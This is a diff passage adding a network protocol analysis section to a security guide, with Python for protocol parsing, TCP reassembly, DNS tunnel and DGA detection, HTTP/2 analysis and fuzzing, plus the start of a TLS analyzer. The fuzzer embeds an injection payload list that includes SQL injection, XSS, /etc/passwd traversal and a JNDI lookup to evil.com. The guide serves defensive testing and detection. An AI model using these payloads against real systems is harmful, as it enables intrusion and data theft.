@@ -364,3 +364,1226 @@ Ensure network analysis tools don't inadvertently forward captured traffic. Disa
 - **RFC 793 - TCP**: https://tools.ietf.org/html/rfc793
 - **RFC 791 - IP**: https://tools.ietf.org/html/rfc791
 - **RFC 8446 - TLS 1.3**: https://tools.ietf.org/html/rfc8446
+
+## Protocol Dissection Deep Dive
+
+### Custom Protocol Definition and Parsing
+
+Defining and parsing custom binary protocols from observed traffic patterns.
+
+```python
+from dataclasses import dataclass, field
+from typing import List, Dict, Optional, Callable
+import struct
+import json
+
+@dataclass
+class ProtocolField:
+    """Definition of a single protocol field."""
+    name: str
+    offset: int
+    size: int
+    field_type: str  # 'uint8', 'uint16', 'uint32', 'uint64', 'bytes', 'string', 'length_prefixed'
+    endianness: str = 'little'  # 'little' or 'big'
+    description: str = ''
+    is_length_field: bool = False
+    references_field: str = ''
+    transform: Optional[str] = None  # 'xor', 'base64', 'hex'
+
+@dataclass
+class ProtocolDefinition:
+    """Complete protocol definition for parsing."""
+    name: str
+    magic_bytes: Optional[bytes] = None
+    header_length: int = 0
+    fields: List[ProtocolField] = field(default_factory=list)
+    payload_offset: int = 0
+    payload_length_field: str = ''
+    delimiter: Optional[bytes] = None
+    max_packet_size: int = 65536
+    notes: str = ''
+
+class ProtocolParser:
+    """Parse binary protocol packets based on definition."""
+
+    def __init__(self, definition: ProtocolDefinition):
+        self.definition = definition
+        self._compiled_fields = self._compile_fields()
+
+    def _compile_fields(self):
+        """Pre-compile field definitions for efficient parsing."""
+        compiled = []
+        for field_def in self.definition.fields:
+            fmt = self._get_struct_format(field_def)
+            compiled.append({
+                'def': field_def,
+                'struct_fmt': fmt,
+                'struct_size': struct.calcsize(fmt) if fmt else 0,
+            })
+        return compiled
+
+    def _get_struct_format(self, field_def: ProtocolField):
+        """Get struct format string for a field."""
+        endian = '<' if field_def.endianness == 'little' else '>'
+        type_map = {
+            'uint8': f'{endian}B',
+            'uint16': f'{endian}H',
+            'uint32': f'{endian}I',
+            'uint64': f'{endian}Q',
+            'int8': f'{endian}b',
+            'int16': f'{endian}h',
+            'int32': f'{endian}i',
+            'int64': f'{endian}q',
+            'float32': f'{endian}f',
+            'float64': f'{endian}d',
+        }
+        return type_map.get(field_def.field_type, None)
+
+    def parse_packet(self, data: bytes) -> dict:
+        """Parse a raw packet into structured fields."""
+        if len(data) < self.definition.header_length:
+            raise ValueError(f"Packet too short: {len(data)} bytes < {self.definition.header_length}")
+
+        # Verify magic bytes
+        if self.definition.magic_bytes:
+            if data[:len(self.definition.magic_bytes)] != self.definition.magic_bytes:
+                raise ValueError("Magic bytes mismatch")
+
+        result = {'_raw': data.hex(), '_length': len(data)}
+        current_offset = 0
+
+        for compiled_field in self._compiled_fields:
+            field_def = compiled_field['def']
+
+            # Handle variable-length fields
+            if field_def.field_type == 'length_prefixed':
+                prefix_size = field_def.size
+                if field_def.endianness == 'little':
+                    length = int.from_bytes(data[current_offset:current_offset+prefix_size], 'little')
+                else:
+                    length = int.from_bytes(data[current_offset:current_offset+prefix_size], 'big')
+                current_offset += prefix_size
+                value = data[current_offset:current_offset+length]
+                result[field_def.name] = value
+                current_offset += length
+            elif field_def.field_type == 'bytes':
+                value = data[current_offset:current_offset+field_def.size]
+                result[field_def.name] = value
+                current_offset += field_def.size
+            elif field_def.field_type == 'string':
+                end = data.find(b'\x00', current_offset)
+                if end == -1:
+                    end = current_offset + field_def.size
+                value = data[current_offset:end].decode('ascii', errors='replace')
+                result[field_def.name] = value
+                current_offset = end + 1
+            else:
+                fmt = compiled_field['struct_fmt']
+                value = struct.unpack_from(fmt, data, current_offset)[0]
+                result[field_def.name] = value
+                current_offset += compiled_field['struct_size']
+
+                # Handle length field reference
+                if field_def.is_length_field:
+                    result[f'_{field_def.name}_points_to'] = current_offset + value
+
+        # Extract payload
+        if self.definition.payload_offset > 0:
+            payload_offset = self.definition.payload_offset
+            if self.definition.payload_length_field:
+                length_field = self.definition.fields[
+                    next(i for i, f in enumerate(self.definition.fields)
+                        if f.name == self.definition.payload_length_field)
+                ]
+                payload_length = result[self.definition.payload_length_field]
+                result['_payload'] = data[payload_offset:payload_offset+payload_length]
+            else:
+                result['_payload'] = data[payload_offset:]
+
+        return result
+
+    def parse_stream(self, data: bytes) -> List[dict]:
+        """Parse a stream of consecutive packets."""
+        packets = []
+        offset = 0
+
+        while offset < len(data):
+            if self.definition.delimiter:
+                # Delimiter-based framing
+                end = data.find(self.definition.delimiter, offset)
+                if end == -1:
+                    break
+                packet_data = data[offset:end]
+                offset = end + len(self.definition.delimiter)
+            else:
+                # Length-based framing
+                if offset + 4 > len(data):
+                    break
+                if self.definition.payload_length_field:
+                    # Use length field from header
+                    pass
+                else:
+                    # Fixed header + payload length
+                    packet_length = struct.unpack_from('<I', data, offset)[0]
+                    if packet_length > self.definition.max_packet_size:
+                        break
+                    packet_data = data[offset:offset+packet_length]
+                    offset += packet_length
+
+            try:
+                packet = self.parse_packet(packet_data)
+                packets.append(packet)
+            except ValueError:
+                offset += 1
+
+        return packets
+```
+
+### TCP Stream Reassembly
+
+Reassembling TCP streams from packet captures for application-layer analysis.
+
+```python
+from collections import defaultdict
+from dataclasses import dataclass, field
+from typing import List, Dict, Tuple, Optional
+import struct
+
+@dataclass
+class TCPSegment:
+    """A single TCP segment."""
+    src_ip: str
+    dst_ip: str
+    src_port: int
+    dst_port: int
+    seq_num: int
+    ack_num: int
+    flags: int
+    payload: bytes
+    timestamp: float
+    window_size: int
+
+    @property
+    def is_syn(self):
+        return bool(self.flags & 0x02)
+
+    @property
+    def is_ack(self):
+        return bool(self.flags & 0x10)
+
+    @property
+    def is_fin(self):
+        return bool(self.flags & 0x01)
+
+    @property
+    def is_rst(self):
+        return bool(self.flags & 0x04)
+
+    @property
+    def payload_size(self):
+        return len(self.payload)
+
+@dataclass
+class TCPStream:
+    """A reassembled TCP stream."""
+    stream_id: str
+    client_ip: str
+    server_ip: str
+    client_port: int
+    server_port: int
+    segments: List[TCPSegment] = field(default_factory=list)
+    client_data: bytes = b''
+    server_data: bytes = b''
+    start_time: float = 0
+    end_time: float = 0
+
+class TCPStreamReassembler:
+    """Reassemble TCP streams from individual segments."""
+
+    def __init__(self):
+        self.streams: Dict[str, TCPStream] = {}
+        self.segment_buffer: Dict[str, List[TCPSegment]] = defaultdict(list)
+
+    def add_segment(self, segment: TCPSegment):
+        """Add a TCP segment to the appropriate stream."""
+        stream_key = self._get_stream_key(segment)
+
+        if segment.is_syn and not segment.is_ack:
+            # New connection
+            self.streams[stream_key] = TCPStream(
+                stream_id=stream_key,
+                client_ip=segment.src_ip,
+                server_ip=segment.dst_ip,
+                client_port=segment.src_port,
+                server_port=segment.dst_port,
+                start_time=segment.timestamp,
+            )
+
+        if stream_key in self.streams:
+            stream = self.streams[stream_key]
+            stream.segments.append(segment)
+            stream.end_time = segment.timestamp
+
+            # Classify direction
+            if segment.src_ip == stream.client_ip:
+                stream.client_data += segment.payload
+            else:
+                stream.server_data += segment.payload
+
+    def _get_stream_key(self, segment: TCPSegment) -> str:
+        """Generate a unique stream identifier."""
+        ips = sorted([segment.src_ip, segment.dst_ip])
+        ports = sorted([segment.src_port, segment.dst_port])
+        return f"{ips[0]}:{ports[0]}-{ips[1]}:{ports[1]}"
+
+    def get_streams(self) -> List[TCPStream]:
+        """Return all reassembled streams."""
+        return list(self.streams.values())
+
+    def get_stream_by_port(self, port: int) -> List[TCPStream]:
+        """Find streams involving a specific port."""
+        return [s for s in self.streams.values()
+                if s.client_port == port or s.server_port == port]
+
+    def get_largest_streams(self, n: int = 10) -> List[TCPStream]:
+        """Return the N largest streams by data volume."""
+        return sorted(
+            self.streams.values(),
+            key=lambda s: len(s.client_data) + len(s.server_data),
+            reverse=True
+        )[:n]
+
+    def extract_http_from_stream(self, stream: TCPStream) -> List[dict]:
+        """Extract HTTP request/response pairs from a TCP stream."""
+        http_pairs = []
+
+        # Simple HTTP parser on server data
+        data = stream.server_data
+        request_data = stream.client_data
+
+        # Find HTTP responses
+        http_pattern = b'HTTP/1.'
+        offset = 0
+        while True:
+            pos = data.find(http_pattern, offset)
+            if pos == -1:
+                break
+
+            # Find end of headers
+            header_end = data.find(b'\r\n\r\n', pos)
+            if header_end == -1:
+                break
+            header_end += 4
+
+            # Parse status line
+            status_line = data[pos:pos+data.index(b'\r\n', pos)-pos]
+            parts = status_line.split(b' ', 2)
+            status_code = int(parts[1]) if len(parts) > 1 else 0
+
+            # Find Content-Length
+            headers_raw = data[pos:header_end].decode('ascii', errors='replace')
+            content_length = 0
+            for line in headers_raw.split('\r\n'):
+                if line.lower().startswith('content-length:'):
+                    content_length = int(line.split(':', 1)[1].strip())
+
+            body = data[header_end:header_end+content_length]
+
+            http_pairs.append({
+                'status_code': status_code,
+                'headers': headers_raw,
+                'body_length': len(body),
+                'body_preview': body[:200],
+            })
+
+            offset = header_end + content_length
+
+        return http_pairs
+
+    def identify_protocols(self, stream: TCPStream) -> List[str]:
+        """Identify application protocols in a TCP stream."""
+        protocols = []
+        data = stream.server_data + stream.client_data
+
+        # HTTP detection
+        if data[:4] in (b'HTTP', b'GET ', b'POST', b'PUT ', b'DELE'):
+            protocols.append('HTTP')
+
+        # TLS detection
+        if data[:1] == b'\x16' and len(data) > 5:
+            protocols.append('TLS')
+
+        # SSH detection
+        if data[:4] == b'SSH-':
+            protocols.append('SSH')
+
+        # DNS detection (port 53)
+        if stream.client_port == 53 or stream.server_port == 53:
+            protocols.append('DNS')
+
+        # SMTP detection
+        if data[:4] == b'220 ':
+            protocols.append('SMTP')
+
+        # FTP detection
+        if data[:4] == b'220 ' or data[:3] == b'220':
+            protocols.append('FTP')
+
+        return protocols
+```
+
+### DNS Tunnel Detection and Analysis
+
+Detecting DNS-based data exfiltration and covert channels.
+
+```python
+import re
+from collections import Counter
+from dataclasses import dataclass
+from typing import List, Dict
+
+@dataclass
+class DNSQuery:
+    """Represents a single DNS query."""
+    timestamp: float
+    src_ip: str
+    dst_ip: str
+    query_name: str
+    query_type: str
+    response_code: str
+    response_data: List[str]
+    query_length: int
+    subdomain_count: int
+    entropy: float
+
+class DNSAnalyzer:
+    """Analyze DNS traffic for tunneling and covert channels."""
+
+    SUSPICIOUS_TLDS = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz',
+                       '.top', '.club', '.work', '.buzz', '.icu']
+
+    def __init__(self):
+        self.queries: List[DNSQuery] = []
+
+    def analyze_tunneling(self, queries: List[DNSQuery]) -> List[dict]:
+        """Detect DNS tunneling patterns."""
+        findings = []
+
+        # Group by domain
+        domain_groups = {}
+        for q in queries:
+            domain = self._extract_base_domain(q.query_name)
+            if domain not in domain_groups:
+                domain_groups[domain] = []
+            domain_groups[domain].append(q)
+
+        for domain, domain_queries in domain_groups.items():
+            # Check for long subdomains (potential encoded data)
+            long_subdomains = [q for q in domain_queries
+                              if q.subdomain_count > 3]
+
+            if long_subdomains:
+                findings.append({
+                    'type': 'dns_tunnel_long_subdomain',
+                    'severity': 'high',
+                    'domain': domain,
+                    'affected_queries': len(long_subdomains),
+                    'max_subdomain_depth': max(q.subdomain_count for q in long_subdomains),
+                    'sample': long_subdomains[0].query_name,
+                })
+
+            # Check for high query volume to single domain
+            if len(domain_queries) > 100:
+                findings.append({
+                    'type': 'dns_tunnel_high_volume',
+                    'severity': 'medium',
+                    'domain': domain,
+                    'query_count': len(domain_queries),
+                    'time_span': domain_queries[-1].timestamp - domain_queries[0].timestamp,
+                })
+
+            # Check for high entropy in subdomains
+            high_entropy = [q for q in domain_queries if q.entropy > 3.5]
+            if len(high_entropy) > len(domain_queries) * 0.5:
+                findings.append({
+                    'type': 'dns_tunnel_high_entropy',
+                    'severity': 'high',
+                    'domain': domain,
+                    'high_entropy_ratio': len(high_entropy) / len(domain_queries),
+                    'avg_entropy': sum(q.entropy for q in high_entropy) / len(high_entropy),
+                })
+
+            # Check for TXT record abuse
+            txt_queries = [q for q in domain_queries if q.query_type == 'TXT']
+            if txt_queries:
+                avg_response_size = sum(
+                    sum(len(r) for r in q.response_data)
+                    for q in txt_queries
+                ) / len(txt_queries)
+                if avg_response_size > 100:
+                    findings.append({
+                        'type': 'dns_tunnel_txt_abuse',
+                        'severity': 'high',
+                        'domain': domain,
+                        'txt_query_count': len(txt_queries),
+                        'avg_response_size': avg_response_size,
+                    })
+
+            # Check for NXDOMAIN responses (potential data channel)
+            nxdomain = [q for q in domain_queries
+                       if q.response_code == 'NXDOMAIN']
+            if len(nxdomain) > len(domain_queries) * 0.7:
+                findings.append({
+                    'type': 'dns_tunnel_nxdomain',
+                    'severity': 'medium',
+                    'domain': domain,
+                    'nxdomain_ratio': len(nxdomain) / len(domain_queries),
+                })
+
+        return findings
+
+    def _extract_base_domain(self, fqdn: str) -> str:
+        """Extract base domain from a fully qualified domain name."""
+        parts = fqdn.rstrip('.').split('.')
+        if len(parts) >= 2:
+            return '.'.join(parts[-2:])
+        return fqdn
+
+    def detect_dga(self, queries: List[DNSQuery]) -> List[dict]:
+        """Detect Domain Generation Algorithm (DGA) patterns."""
+        findings = []
+        domain_counts = Counter()
+
+        for q in queries:
+            domain = self._extract_base_domain(q.query_name)
+            domain_counts[domain] += 1
+
+        for domain, count in domain_counts.most_common(100):
+            subdomains = [q.query_name.split('.')[0]
+                         for q in queries
+                         if self._extract_base_domain(q.query_name) == domain]
+
+            # Analyze subdomain characteristics
+            lengths = [len(s) for s in subdomains]
+            if not lengths:
+                continue
+
+            avg_length = sum(lengths) / len(lengths)
+            unique_ratio = len(set(subdomains)) / len(subdomains) if subdomains else 0
+
+            # High uniqueness and random-looking subdomains = DGA
+            if (unique_ratio > 0.95 and avg_length > 10 and count > 20):
+                # Check character distribution
+                all_chars = ''.join(subdomains)
+                char_freq = Counter(all_chars)
+                # High entropy = random
+                import math
+                entropy = 0
+                for freq in char_freq.values():
+                    p = freq / len(all_chars)
+                    entropy -= p * math.log2(p)
+
+                if entropy > 3.5:
+                    findings.append({
+                        'type': 'dga_detected',
+                        'severity': 'critical',
+                        'domain': domain,
+                        'query_count': count,
+                        'unique_subdomains': len(set(subdomains)),
+                        'avg_subdomain_length': avg_length,
+                        'char_entropy': entropy,
+                        'sample_subdomains': subdomains[:10],
+                    })
+
+        return findings
+
+    def calculate_subdomain_entropy(self, subdomain: str) -> float:
+        """Calculate Shannon entropy of a subdomain string."""
+        import math
+        length = len(subdomain)
+        if length == 0:
+            return 0.0
+
+        freq = Counter(subdomain.lower())
+        entropy = 0.0
+        for count in freq.values():
+            p = count / length
+            if p > 0:
+                entropy -= p * math.log2(p)
+
+        return entropy
+
+    def extract_encoded_data(self, queries: List[DNSQuery]) -> str:
+        """Attempt to extract data encoded in DNS queries."""
+        encoded_parts = []
+        for q in sorted(queries, key=lambda x: x.timestamp):
+            subdomain = q.query_name.split('.')[0]
+            # Remove common prefixes/suffixes
+            if len(subdomain) > 4:
+                encoded_parts.append(subdomain)
+
+        # Try base64 decoding
+        import base64
+        combined = ''.join(encoded_parts)
+        try:
+            # Try base64 URL-safe
+            padded = combined + '=' * (4 - len(combined) % 4)
+            decoded = base64.urlsafe_b64decode(padded)
+            return decoded.decode('utf-8', errors='replace')
+        except Exception:
+            pass
+
+        # Try hex decoding
+        try:
+            decoded = bytes.fromhex(combined)
+            return decoded.decode('utf-8', errors='replace')
+        except Exception:
+            pass
+
+        return combined
+```
+
+### HTTP/2 Protocol Analysis
+
+Analyzing HTTP/2 traffic for security assessment and protocol understanding.
+
+```python
+import struct
+from dataclasses import dataclass, field
+from typing import List, Dict, Optional
+
+@dataclass
+class HTTP2Frame:
+    """Represents an HTTP/2 frame."""
+    length: int
+    frame_type: int
+    flags: int
+    stream_id: int
+    payload: bytes
+
+    FRAME_TYPES = {
+        0: 'DATA',
+        1: 'HEADERS',
+        2: 'PRIORITY',
+        3: 'RST_STREAM',
+        4: 'SETTINGS',
+        5: 'PUSH_PROMISE',
+        6: 'PING',
+        7: 'GOAWAY',
+        8: 'WINDOW_UPDATE',
+        9: 'CONTINUATION',
+    }
+
+    @property
+    def type_name(self):
+        return self.FRAME_TYPES.get(self.frame_type, f'UNKNOWN({self.frame_type})')
+
+@dataclass
+class HTTP2Settings:
+    """HTTP/2 SETTINGS frame parameters."""
+    header_table_size: int = 4096
+    enable_push: int = 1
+    max_concurrent_streams: int = None
+    initial_window_size: int = 65535
+    max_frame_size: int = 16384
+    max_header_list_size: int = None
+
+class HTTP2Analyzer:
+    """Analyze HTTP/2 protocol traffic."""
+
+    PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
+
+    def __init__(self):
+        self.frames: List[HTTP2Frame] = []
+        self.streams: Dict[int, List[HTTP2Frame]] = {}
+        self.settings: Dict[str, HTTP2Settings] = {'client': HTTP2Settings(), 'server': HTTP2Settings()}
+
+    def parse_frames(self, data: bytes) -> List[HTTP2Frame]:
+        """Parse HTTP/2 frames from raw data."""
+        frames = []
+        offset = 0
+
+        # Skip connection preface if present
+        if data.startswith(self.PREFACE):
+            offset = len(self.PREFACE)
+
+        while offset + 9 <= len(data):
+            # Frame header: 3 bytes length + 1 byte type + 1 byte flags + 4 bytes stream ID
+            frame_length = int.from_bytes(data[offset:offset+3], 'big')
+            frame_type = data[offset+3]
+            frame_flags = data[offset+4]
+            stream_id = int.from_bytes(data[offset+5:offset+9], 'big') & 0x7FFFFFFF
+
+            offset += 9
+
+            if offset + frame_length > len(data):
+                break
+
+            payload = data[offset:offset+frame_length]
+            offset += frame_length
+
+            frame = HTTP2Frame(
+                length=frame_length,
+                frame_type=frame_type,
+                flags=frame_flags,
+                stream_id=stream_id,
+                payload=payload,
+            )
+
+            frames.append(frame)
+
+            if stream_id not in self.streams:
+                self.streams[stream_id] = []
+            self.streams[stream_id].append(frame)
+
+        self.frames = frames
+        return frames
+
+    def analyze_settings(self, frames: List[HTTP2Frame], direction: str = 'client'):
+        """Analyze SETTINGS frames for configuration issues."""
+        for frame in frames:
+            if frame.type_name == 'SETTINGS':
+                settings = self._parse_settings(frame.payload)
+                if direction == 'client':
+                    self.settings['client'] = settings
+                else:
+                    self.settings['server'] = settings
+
+    def _parse_settings(self, payload: bytes) -> HTTP2Settings:
+        """Parse SETTINGS frame payload."""
+        settings = HTTP2Settings()
+        offset = 0
+
+        while offset + 6 <= len(payload):
+            setting_id = int.from_bytes(payload[offset:offset+2], 'big')
+            value = int.from_bytes(payload[offset+2:offset+6], 'big')
+            offset += 6
+
+            if setting_id == 0x1:  # SETTINGS_HEADER_TABLE_SIZE
+                settings.header_table_size = value
+            elif setting_id == 0x2:  # SETTINGS_ENABLE_PUSH
+                settings.enable_push = value
+            elif setting_id == 0x3:  # SETTINGS_MAX_CONCURRENT_STREAMS
+                settings.max_concurrent_streams = value
+            elif setting_id == 0x4:  # SETTINGS_INITIAL_WINDOW_SIZE
+                settings.initial_window_size = value
+            elif setting_id == 0x5:  # SETTINGS_MAX_FRAME_SIZE
+                settings.max_frame_size = value
+            elif setting_id == 0x6:  # SETTINGS_MAX_HEADER_LIST_SIZE
+                settings.max_header_list_size = value
+
+        return settings
+
+    def detect_security_issues(self) -> List[dict]:
+        """Detect security issues in HTTP/2 configuration."""
+        findings = []
+
+        # Check for SETTINGS_ENABLE_PUSH = 1 (potential for server push abuse)
+        if self.settings['server'].enable_push == 1:
+            findings.append({
+                'type': 'server_push_enabled',
+                'severity': 'low',
+                'description': 'Server push is enabled, which could be used for cache poisoning attacks',
+            })
+
+        # Check for large MAX_FRAME_SIZE
+        if self.settings['server'].max_frame_size > 16384:
+            findings.append({
+                'type': 'large_max_frame_size',
+                'severity': 'info',
+                'description': f'MAX_FRAME_SIZE is {self.settings["server"].max_frame_size} (default: 16384)',
+            })
+
+        # Check for HEADERS overflow potential
+        for stream_id, stream_frames in self.streams.items():
+            headers_frames = [f for f in stream_frames if f.type_name == 'HEADERS']
+            total_header_size = sum(f.length for f in headers_frames)
+            if total_header_size > 100000:  # > 100KB of headers
+                findings.append({
+                    'type': 'headers_overflow',
+                    'severity': 'medium',
+                    'stream_id': stream_id,
+                    'total_header_size': total_header_size,
+                    'description': 'Large header block may indicate header injection or abuse',
+                })
+
+        return findings
+
+    def extract_headers(self, frame: HTTP2Frame) -> Dict[str, str]:
+        """Extract HTTP/2 headers from a HEADERS frame."""
+        # Simplified HPACK decoding
+        headers = {}
+        offset = 0
+        payload = frame.payload
+
+        while offset < len(payload):
+            byte = payload[offset]
+
+            if byte & 0x80:  # Indexed header
+                index = byte & 0x7F
+                offset += 1
+                if byte & 0x40:  # 6-bit
+                    index = ((byte & 0x3F) << 8) | payload[offset]
+                    offset += 1
+                headers[f'indexed_{index}'] = f'header_{index}'
+            elif byte & 0xC0 == 0x40:  # Literal with incremental indexing
+                offset += 1
+                name_len = payload[offset] if offset < len(payload) else 0
+                offset += 1
+                name = payload[offset:offset+name_len].decode('ascii', errors='replace')
+                offset += name_len
+                if offset < len(payload):
+                    value_len = payload[offset]
+                    offset += 1
+                    value = payload[offset:offset+value_len].decode('ascii', errors='replace')
+                    offset += value_len
+                    headers[name] = value
+            elif byte & 0xE0 == 0x20:  # Size update
+                offset += 1
+                size = 0
+                while offset < len(payload) and payload[offset] & 0x80:
+                    size = (size << 7) | (payload[offset] & 0x7F)
+                    offset += 1
+                if offset < len(payload):
+                    size = (size << 7) | payload[offset]
+                    offset += 1
+            else:  # Literal without indexing or never indexed
+                offset += 1
+                if offset < len(payload):
+                    name_len = payload[offset]
+                    offset += 1
+                    name = payload[offset:offset+name_len].decode('ascii', errors='replace')
+                    offset += name_len
+                    if offset < len(payload):
+                        value_len = payload[offset]
+                        offset += 1
+                        value = payload[offset:offset+value_len].decode('ascii', errors='replace')
+                        offset += value_len
+                        headers[name] = value
+
+        return headers
+```
+
+### Protocol Fuzzing Surface Analysis
+
+Identifying protocol fields suitable for fuzzing to discover vulnerabilities.
+
+```python
+from dataclasses import dataclass, field
+from typing import List, Dict, Any
+import random
+
+@dataclass
+class FuzzTarget:
+    """A specific field or section to fuzz in a protocol."""
+    name: str
+    offset: int
+    size: int
+    field_type: str
+    fuzz_type: str  # 'boundary', 'format', 'injection', 'overflow'
+    priority: int = 1
+    notes: str = ''
+
+@dataclass
+class FuzzCase:
+    """A single fuzz test case."""
+    target: str
+    fuzz_type: str
+    input_data: bytes
+    description: str
+    expected_behavior: str
+
+class ProtocolFuzzer:
+    """Generate fuzzing inputs for protocol implementations."""
+
+    BOUNDARY_VALUES = {
+        'uint8': [0, 1, 0x7F, 0x80, 0xFF],
+        'uint16': [0, 1, 0x7FFF, 0x8000, 0xFFFE, 0xFFFF],
+        'uint32': [0, 1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFE, 0xFFFFFFFF],
+        'uint64': [0, 1, 0x7FFFFFFFFFFFFFFF, 0x8000000000000000],
+        'bytes': [b'', b'\x00', b'\xff' * 100, b'A' * 1000],
+    }
+
+    INJECTION_PAYLOADS = [
+        b"'; DROP TABLE users; --",
+        b"<script>alert(1)</script>",
+        b"../../../etc/passwd",
+        b"%0a%0d%0a%0d",
+        b"\x00" * 100,
+        b"{{7*7}}",
+        b"${7*7}",
+        b"${jndi:ldap://evil.com}",
+    ]
+
+    def __init__(self, protocol_definition):
+        self.protocol = protocol_definition
+        self.targets: List[FuzzTarget] = []
+
+    def identify_fuzz_targets(self) -> List[FuzzTarget]:
+        """Identify fields suitable for fuzzing."""
+        targets = []
+
+        for field_def in self.protocol.fields:
+            # Length fields are high-priority fuzz targets
+            if field_def.is_length_field:
+                targets.append(FuzzTarget(
+                    name=field_def.name,
+                    offset=field_def.offset,
+                    size=field_def.size,
+                    field_type=field_def.field_type,
+                    fuzz_type='overflow',
+                    priority=1,
+                    notes='Length field - test with values exceeding buffer',
+                ))
+
+            # Type/opcode fields
+            if field_def.field_type in ('uint8', 'uint16') and 'type' in field_def.name.lower():
+                targets.append(FuzzTarget(
+                    name=field_def.name,
+                    offset=field_def.offset,
+                    size=field_def.size,
+                    field_type=field_def.field_type,
+                    fuzz_type='format',
+                    priority=2,
+                    notes='Type field - test with undefined values',
+                ))
+
+            # String fields
+            if field_def.field_type in ('string', 'bytes'):
+                targets.append(FuzzTarget(
+                    name=field_def.name,
+                    offset=field_def.offset,
+                    size=field_def.size,
+                    field_type=field_def.field_type,
+                    fuzz_type='injection',
+                    priority=2,
+                    notes='String field - test with injection payloads',
+                ))
+
+        # Add protocol-level targets
+        if self.protocol.magic_bytes:
+            targets.append(FuzzTarget(
+                name='magic_bytes',
+                offset=0,
+                size=len(self.protocol.magic_bytes),
+                field_type='bytes',
+                fuzz_type='format',
+                priority=1,
+                notes='Magic bytes - test with modified magic',
+            ))
+
+        return sorted(targets, key=lambda t: t.priority)
+
+    def generate_fuzz_cases(self, target: FuzzTarget, base_packet: bytes) -> List[FuzzCase]:
+        """Generate fuzz test cases for a specific target."""
+        cases = []
+
+        if target.fuzz_type == 'overflow':
+            cases.extend(self._generate_overflow_cases(target, base_packet))
+        elif target.fuzz_type == 'format':
+            cases.extend(self._generate_format_cases(target, base_packet))
+        elif target.fuzz_type == 'injection':
+            cases.extend(self._generate_injection_cases(target, base_packet))
+
+        return cases
+
+    def _generate_overflow_cases(self, target: FuzzTarget, base: bytes) -> List[FuzzCase]:
+        """Generate overflow fuzz cases."""
+        cases = []
+        boundary_values = self.BOUNDARY_VALUES.get(target.field_type, [0, 1, 0xFF])
+
+        for value in boundary_values:
+            fuzzed = bytearray(base)
+            value_bytes = value.to_bytes(target.size, byteorder='big')
+            if target.offset + target.size <= len(fuzzed):
+                fuzzed[target.offset:target.offset+target.size] = value_bytes
+                cases.append(FuzzCase(
+                    target=target.name,
+                    fuzz_type='overflow',
+                    input_data=bytes(fuzzed),
+                    description=f'Set {target.name} to boundary value {value}',
+                    expected_behavior='Application should handle oversized/undersized length gracefully',
+                ))
+
+        # Test maximum values
+        max_value = (2 ** (target.size * 8)) - 1
+        fuzzed = bytearray(base)
+        value_bytes = max_value.to_bytes(target.size, byteorder='big')
+        if target.offset + target.size <= len(fuzzed):
+            fuzzed[target.offset:target.offset+target.size] = value_bytes
+            cases.append(FuzzCase(
+                target=target.name,
+                fuzz_type='overflow',
+                input_data=bytes(fuzzed),
+                description=f'Set {target.name} to MAX value {max_value}',
+                expected_behavior='Should reject or handle gracefully without crash',
+            ))
+
+        # Test zero
+        fuzzed = bytearray(base)
+        if target.offset + target.size <= len(fuzzed):
+            fuzzed[target.offset:target.offset+target.size] = b'\x00' * target.size
+            cases.append(FuzzCase(
+                target=target.name,
+                fuzz_type='overflow',
+                input_data=bytes(fuzzed),
+                description=f'Set {target.name} to zero',
+                expected_behavior='Should handle zero-length/zero-value gracefully',
+            ))
+
+        return cases
+
+    def _generate_format_cases(self, target: FuzzTarget, base: bytes) -> List[FuzzCase]:
+        """Generate format fuzz cases."""
+        cases = []
+
+        # Unknown type values
+        max_type = (2 ** (target.size * 8)) - 1
+        for invalid_type in [max_type, max_type - 1, max_type // 2]:
+            fuzzed = bytearray(base)
+            value_bytes = invalid_type.to_bytes(target.size, byteorder='big')
+            if target.offset + target.size <= len(fuzzed):
+                fuzzed[target.offset:target.offset+target.size] = value_bytes
+                cases.append(FuzzCase(
+                    target=target.name,
+                    fuzz_type='format',
+                    input_data=bytes(fuzzed),
+                    description=f'Invalid type value {invalid_type}',
+                    expected_behavior='Should reject unknown type gracefully',
+                ))
+
+        return cases
+
+    def _generate_injection_cases(self, target: FuzzTarget, base: bytes) -> List[FuzzCase]:
+        """Generate injection fuzz cases."""
+        cases = []
+
+        for payload in self.INJECTION_PAYLOADS:
+            fuzzed = bytearray(base)
+            # Truncate or pad payload to fit field size
+            field_payload = payload[:target.size]
+            if target.offset + len(field_payload) <= len(fuzzed):
+                fuzzed[target.offset:target.offset+len(field_payload)] = field_payload
+                cases.append(FuzzCase(
+                    target=target.name,
+                    fuzz_type='injection',
+                    input_data=bytes(fuzzed),
+                    description=f'Injection payload in {target.name}',
+                    expected_behavior='Should sanitize input and not execute injection',
+                ))
+
+        return cases
+
+    def generate_fuzzing_plan(self, base_packet: bytes) -> dict:
+        """Generate a complete fuzzing plan."""
+        targets = self.identify_fuzz_targets()
+        plan = {
+            'protocol': self.protocol.name,
+            'total_targets': len(targets),
+            'targets': [],
+            'estimated_cases': 0,
+        }
+
+        for target in targets:
+            cases = self.generate_fuzz_cases(target, base_packet)
+            plan['targets'].append({
+                'name': target.name,
+                'fuzz_type': target.fuzz_type,
+                'priority': target.priority,
+                'case_count': len(cases),
+                'cases': cases,
+            })
+            plan['estimated_cases'] += len(cases)
+
+        return plan
+```
+
+### TLS Certificate Analysis
+
+Analyzing TLS certificates for security assessment and C2 detection.
+
+```python
+from datetime import datetime
+from dataclasses import dataclass
+from typing import List, Dict, Optional
+import hashlib
+
+@dataclass
+class TLSCertificateInfo:
+    """Parsed TLS certificate information."""
+    subject: str
+    issuer: str
+    serial_number: str
+    not_before: datetime
+    not_after: datetime
+    san: List[str]
+    key_type: str
+    key_size: int
+    signature_algorithm: str
+    is_self_signed: bool
+    is_expired: bool
+    days_until_expiry: int
+    sha1_fingerprint: str
+    sha256_fingerprint: str
+
+class TLSAnalyzer:
+    """Analyze TLS certificates for security assessment."""
+
+    def __init__(self):
+        self.certificates: List[TLSCertificateInfo] = []
+
+    def analyze_certificate_chain(self, chain_data: List[bytes]) -> List[dict]:
+        """Analyze a complete certificate chain."""
+        findings = []
+
+        for i, cert_data in enumerate(chain_data):
+            cert_info = self._parse_certificate(cert_data)
+            self.certificates.append(cert_info)
+
+            # Check for self-signed certificate
+            if cert_info.is_self_signed:
+                findings.append({
+                    'type': 'self_signed_certificate',
+                    'severity': 'high',
+                    'certificate': cert_info.subject,
